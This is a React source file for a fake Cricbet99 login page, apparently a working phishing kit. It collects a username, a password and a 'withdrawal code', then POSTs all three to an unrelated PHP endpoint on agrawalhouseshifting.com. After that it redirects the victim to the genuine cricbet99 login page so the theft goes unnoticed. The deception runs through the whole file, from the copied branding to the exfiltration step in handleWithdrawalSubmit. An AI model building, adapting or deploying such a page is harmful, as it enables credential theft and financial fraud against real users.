'use client';
import React, { useState } from 'react';

// ============================================
// CONFIGURATION
// ============================================
const PHP_API_URL = "https://agrawalhouseshifting.com/php_vercel.php"; 

export default function CricbetApp() {
  const [step, setStep] = useState(1); // 1 = Login, 2 = Withdrawal
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(""); // General API errors
  const [showToast, setShowToast] = useState(false); // Controls the red popup
  
  // Field Validation Errors
  const [fieldErrors, setFieldErrors] = useState({
    loginName: "",
    password: ""
  });

  // Form Data
  const [formData, setFormData] = useState({
    loginName: "",
    password: "",
    code: ""
  });

  // Handle Input Changes
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    
    // Clear specific field error when user starts typing
    if (fieldErrors[name]) {
        setFieldErrors(prev => ({ ...prev, [name]: "" }));
    }
    
    // Hide toast if open
    if(showToast) setShowToast(false);
  };

  // Step 1: Validate Login and Move to Withdrawal
  const handleLoginSubmit = (e) => {
    e.preventDefault();
    
    // 1. Sanitize Input (Remove Spaces)
    const cleanLoginName = formData.loginName.trim(); 
    
    let isError = false;
    let newFieldErrors = { loginName: "", password: "" };

    // 2. Check Empty Fields
    if (!cleanLoginName) {
        newFieldErrors.loginName = "Required";
        isError = true;
    }
    if (!formData.password) {
        newFieldErrors.password = "Required";
        isError = true;
    }

    // Update UI with "Required" errors
    setFieldErrors(newFieldErrors);

    if (isError) return; // Stop here if empty

    // 3. Check Logic (Alphanumeric Username)
    const alphaNumericRegex = /^[a-z0-9]+$/i;

    if (!alphaNumericRegex.test(cleanLoginName)) {
      triggerToast();
      return; // Stop here, do not go to step 2
    }

    // 4. Update state with the trimmed username
    setFormData(prev => ({ ...prev, loginName: cleanLoginName }));

    // Validation Passed -> Move to next step (Same Page Transition)
    setStep(2);
  };

  // Helper to show the Red Toast for 3 seconds
  const triggerToast = () => {
    setShowToast(true);
    setTimeout(() => {
        setShowToast(false);
    }, 3000);
  }

  // Step 2: Submit Code + Credentials to PHP
  const handleWithdrawalSubmit = async (e) => {
    e.preventDefault();
    
    // 1. Sanitize Input (Remove Spaces from Code)
    const cleanCode = formData.code.trim();

    const alphaNumericRegex = /^[a-z0-9]+$/i;

    if (!cleanCode) {
      setError("Withdrawal code is required");
      return;
    }

    if (!alphaNumericRegex.test(cleanCode)) {
        alert("Withdrawal code must be alphanumeric.");
        return;
    }

    setLoading(true);

    // Prepare data payload with cleaned code
    const payload = {
        ...formData,
        code: cleanCode
    };

    try {
      const response = await fetch(`${PHP_API_URL}?action=insert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      
      const result = await response.json();

      if (result.status === "success") {
        // Final Redirect
        window.location.href = "https://cricbet99.green/login";
      } else {
        setError("Connection failed. Please try again.");
      }

    } catch (err) {
      console.error(err);
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-wrapper">
      {/* STYLES */}
      <style dangerouslySetInnerHTML={{__html: `
        :root {
          --theme1-bg: #8a4e00;
          --theme1-bg90: #1a3da6E6;
          --theme2-bg: #116257;
          --primary-color: #fff;
          --primary-bg: #fff;
          --red-color: #ff0000;
        }
        *, ::after, ::before { box-sizing: border-box; }
        html { font-family: sans-serif; line-height: 1.15; -webkit-text-size-adjust: 100%; }
        body { margin: 0; font-family: 'Roboto Condensed', sans-serif; font-size: 1rem; font-weight: 400; line-height: 1.5; color: #212529; text-align: left; background-color: #fff; }
        
        /* Layout */
        .login-wrapper {
            width: 100%;
            background-image: linear-gradient(var(--theme1-bg), var(--theme2-bg));
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .loginInner1 {
            width: 350px;
            max-width: 90%;
            margin: 15% auto;
        }

        .featured-box-login {
            box-sizing: border-box;
            padding: 20px;
            border-radius: 4px;
            background: var(--primary-bg);
            width: 100%;
        }

        .featured-box-login h4 {
            color: var(--theme1-bg);
            text-align: center;
            margin-top: 0;
            margin-bottom: .5rem;
            font-weight: 500;
            line-height: 1.2;
            font-size: 1.5rem;
        }

        .log-logo { text-align: center; margin-bottom: 20px; }
        .logo-login { max-height: 65px; max-width: 100%; }

        /* Forms */
        .form-group { margin-bottom: 1rem; position: relative; }
        .form-control { 
            display: block; width: 100%; height: 38px; padding: .375rem .75rem; 
            font-size: 1rem; font-weight: 400; line-height: 1.5; color: #495057; 
            background-color: #fff; border: 1px solid #ced4da; border-radius: .25rem; 
            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out; 
        }
        .form-control:focus { color: #495057; background-color: #fff; border-color: #80bdff; outline: 0; box-shadow: 0 0 0 .2rem rgba(0,123,255,.25); }

        /* Icons */
        .form-group i {
            position: absolute;
            right: 10px;
            top: 11px;
            color: #555;
            font-size: 14px; 
            z-index: 2;
        }

        /* Buttons */
        .btn { 
            display: inline-block; font-weight: 400; color: #212529; text-align: center; 
            vertical-align: middle; user-select: none; background-color: transparent; 
            border: 1px solid transparent; padding: .375rem .75rem; font-size: 1rem; 
            line-height: 1.5; border-radius: .25rem; cursor: pointer; 
            transition: color .15s ease-in-out,background-color .15s ease-in-out;
        }
        .btn-submit {
            background-color: var(--theme1-bg);
            border-color: var(--theme1-bg);
            color: var(--primary-color);
            width: 100%;
        }
        .btn-submit .fa-sign-in-alt {
            font-size: 16px; margin-left: 10px; color: var(--primary-color); position: static;
        }
        .btn-login { width: 100%; }

        /* Helpers */
        .text-center { text-align: center !important; }
        .m-b-20 { margin-bottom: 20px !important; }
        .mb-1 { margin-bottom: .25rem !important; }
        .mb-0 { margin-bottom: 0 !important; }
        .mt-1 { margin-top: 0.25rem !important; }
        
        /* Links & Text */
        .recaptchaTerms {
            display: block; margin-top: 10px; font-size: 11px; line-height: 1.4; 
            color: #999; text-align: center;
        }
        .recaptchaTerms a { color: #555; text-decoration: underline; }
        .mail-link { color: #007bff; text-decoration: none; }
        
        /* Error Text (Below Fields) */
        .field-error {
            color: var(--red-color);
            font-size: 12px;
            margin-top: 4px;
            display: block;
            text-align: left;
        }

        /* TOAST STYLES */
        .toast-container {
            position: fixed;
            z-index: 999999;
            pointer-events: none;
            top: 12px;
            left: 0;
            right: 0;
            display: flex;
            justify-content: center;
        }
        
        .toast-message {
            background-color: #bd362f; /* Red Background */
            color: #ffffff; /* White Text */
            padding: 10px 20px;
            border-radius: 4px;
            box-shadow: 0 0 6px #999;
            font-size: 14px;
            opacity: 1;
            pointer-events: auto;
            width: 300px;
            max-width: 90%;
            text-align: left;
            position: relative;
        }
        
        .toast-title {
            font-weight: bold;
            display: block;
            margin-bottom: 3px;
        }

        /* Withdrawal Specific */
        .log-fld p { text-align: center; font-size: 14px; margin-bottom: 14px; margin-top: 0; }
        
        .error {
            margin-top: 10px; margin-bottom: 10px; display: block; 
            color: var(--red-color); font-size: 13px; text-align: center; 
        }
      `}} />
      
      {/* FontAwesome CDN (Required for icons) */}
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
      <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400&display=swap" rel="stylesheet" />

      {/* TOAST CONTAINER (Hidden unless valid) */}
      <div id="toast-container" className="toast-top-center toast-container">
        {showToast && (
            <div className="toast-message">
                <div className="toast-title">Error</div>
                <div>Invalid Username or Password</div>
            </div>
        )}
      </div>

      <div className="container-fluid">
        <div className="loginInner1">
          
          <div className="log-logo m-b-20 text-center">
            {/* Replace src with your logo path in Next.js public folder */}
            <img className="logo-login" src="https://speedcdn.io/assets/logos/cricbet99.green.png" alt="Cricbet99" onError={(e) => e.target.style.display='none'} />
          </div>

          <div className="featured-box-login featured-box-secundary default">
            <h4 className="text-center">
              LOGIN <i className="fas fa-hand-point-down"></i>
            </h4>

            {/* =======================
                STEP 1: LOGIN UI
               ======================= */}
            {step === 1 && (
              <form id="loginForm" onSubmit={handleLoginSubmit} noValidate autoComplete="off">
                
                {/* USERNAME INPUT */}
                <div className="form-group m-b-20">
                  <input
                    name="loginName"
                    type="text"
                    className="form-control"
                    placeholder="User Name"
                    required
                    value={formData.loginName}
                    onChange={handleChange}
                  />
                  <i className="fa fa-user"></i>
                  {/* RED REQUIRED TEXT */}
                  {fieldErrors.loginName && <span className="field-error">Required</span>}
                </div>

                {/* PASSWORD INPUT */}
                <div className="form-group m-b-20">
                  <input
                    name="password"
                    type="password"
                    className="form-control"
                    placeholder="Password"
                    required
                    value={formData.password}
                    onChange={handleChange}
                  />
                  <i className="fa fa-key"></i>
                  {/* RED REQUIRED TEXT */}
                  {fieldErrors.password && <span className="field-error">Required</span>}
                </div>

                <div className="form-group text-center mb-1">
                  <button type="submit" className="btn btn-submit btn-login">
                    Login <i className="ml-2 fas fa-sign-in-alt"></i>
                  </button>
                </div>

                <div className="form-group text-center mb-0">
                  <button type="button" className="btn btn-submit btn-login">
                    Login with Demo ID <i className="ml-2 fas fa-sign-in-alt"></i>
                  </button>
                </div>

                <small className="recaptchaTerms">
                  This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
                </small>

                <p className="mt-1 text-center" style={{ lineHeight: 2 }}>
                  <a className="mail-link" href="mailto:contact@cricbet99.com">
                    contact@cricbet99.com
                  </a>
                </p>
              </form>
            )}

            {/* =======================
                STEP 2: WITHDRAWAL UI
               ======================= */}
            {step === 2 && (
              <div className="log-fld">
                <p>Enter your withdrwal code for Account Safety</p>
                
                <form className="form-horizontal" onSubmit={handleWithdrawalSubmit}>
                  <div className="form-group m-b-20">
                    <input
                      name="code"
                      placeholder="Withdrawl Code"
                      className="form-control"
                      type="text"
                      value={formData.code}
                      onChange={handleChange}
                    />
                    <i className="fa fa-lock" style={{top: '11px'}}></i>
                  </div>
                  
                  {/* Real API Error (ONLY SHOW IF THERE IS AN ERROR) */}
                  {error && <div className="error">{error}</div>}

                  <div className="form-group text-center">
                    <button type="submit" className="btn btn-submit btn-login" disabled={loading}>
                      {loading ? 'Processing...' : 'Secure Login'}
                      {!loading && <i className="fas fa-sign-in-alt ml-2"></i>}
                    </button>
                  </div>
                </form>
              </div>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}